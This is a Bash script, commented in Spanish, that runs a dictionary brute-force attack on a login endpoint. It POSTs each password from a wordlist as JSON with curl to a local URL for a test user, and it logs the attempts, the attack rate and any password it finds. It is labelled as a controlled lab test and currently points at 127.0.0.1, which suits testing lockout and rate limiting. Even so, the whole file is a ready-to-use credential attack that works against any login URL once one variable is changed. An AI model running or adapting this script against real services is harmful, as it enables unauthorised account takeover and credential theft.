#!/usr/bin/env bash
# ./brute_force.sh
# Prueba de fuerza bruta controlada (solo en entornos de laboratorio)

# set -x   # descomenta para debugging detallado

TARGET_URL="http://127.0.0.1:8000/login"
TARGET_USERNAME="tester_brute"
PASSWORD_FILE="passwords.txt"
LOG_FILE="brute_force_results.log"

# Parámetros
MAX_SLEEP=0.05   # pausa entre intentos (segundos). Ajusta según tu experimento.

# Archivos temporales (si fueran necesarios)
TMP_SUCCESS="__brute_success.tmp"

cleanup() {
    rm -f "$TMP_SUCCESS"
}
trap cleanup EXIT

# Comprobaciones previas
if [ ! -f "$PASSWORD_FILE" ]; then
  echo "ERROR: no se encontró el archivo de contraseñas '$PASSWORD_FILE'." >&2
  exit 2
fi

echo "--- Inicio de Prueba de Fuerza Bruta Controlada ---" > "$LOG_FILE"
echo "URL: $TARGET_URL" | tee -a "$LOG_FILE"
echo "Usuario objetivo: $TARGET_USERNAME" | tee -a "$LOG_FILE"
echo "Cargando contraseñas desde: $PASSWORD_FILE" | tee -a "$LOG_FILE"
echo "----------------------------------------------------" | tee -a "$LOG_FILE"

START_TIME=$(date +%s.%N)
ATTEMPTS=0
SUCCESS=false
FOUND_PASSWORD=""

# Lectura línea por línea (maneja espacios y evita problemas con xargs)
# Eliminamos retornos de carro con tr -d '\r'
while IFS= read -r line || [ -n "$line" ]; do
    password=$(printf "%s" "$line" | tr -d '\r')
    if [ -z "$password" ]; then
        continue
    fi

    ATTEMPTS=$((ATTEMPTS + 1))
    JSON_DATA=$(printf '{"username":"%s","password":"%s"}' "$TARGET_USERNAME" "$password")

    HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
      -H "Content-Type: application/json" \
      -d "$JSON_DATA" \
      "$TARGET_URL")

    TIMESTAMP=$(date +'%Y-%m-%d %H:%M:%S')
    if [ "$HTTP_STATUS" = "200" ]; then
        echo "[$TIMESTAMP] ✅ ÉXITO: intento $ATTEMPTS - $TARGET_USERNAME:$password" | tee -a "$LOG_FILE"
        SUCCESS=true
        FOUND_PASSWORD="$password"
        echo "true" > "$TMP_SUCCESS"
        break
    else
        echo "[$TIMESTAMP] ❌ Fallido: intento $ATTEMPTS - '$password' - HTTP $HTTP_STATUS" >> "$LOG_FILE"
    fi

    sleep "$MAX_SLEEP"
done < <(tr -d '\r' < "$PASSWORD_FILE")

END_TIME=$(date +%s.%N)
DURATION=$(awk "BEGIN {print $END_TIME - $START_TIME}")
if (( $(awk "BEGIN {print ($DURATION <= 0)}") )); then
  RATE="N/A"
else
  RATE=$(awk "BEGIN {printf \"%.2f\", $ATTEMPTS / $DURATION}")
fi

echo "----------------------------------------------------" | tee -a "$LOG_FILE"
echo "Resumen del Ataque" | tee -a "$LOG_FILE"
echo "Intentos totales: $ATTEMPTS" | tee -a "$LOG_FILE"
printf "Tiempo total: %s segundos\n" "$DURATION" | tee -a "$LOG_FILE"
printf "Tasa de ataque: %s intentos/segundo\n" "$RATE" | tee -a "$LOG_FILE"

if [ "$SUCCESS" = true ]; then
    echo "Resultado: Ataque de fuerza bruta EXITOSO. Credencial encontrada: $TARGET_USERNAME:$FOUND_PASSWORD" | tee -a "$LOG_FILE"
else
    echo "Resultado: Ataque de fuerza bruta fallido (contraseña no encontrada)." | tee -a "$LOG_FILE"
fi

echo "Resultados completos guardados en $LOG_FILE"
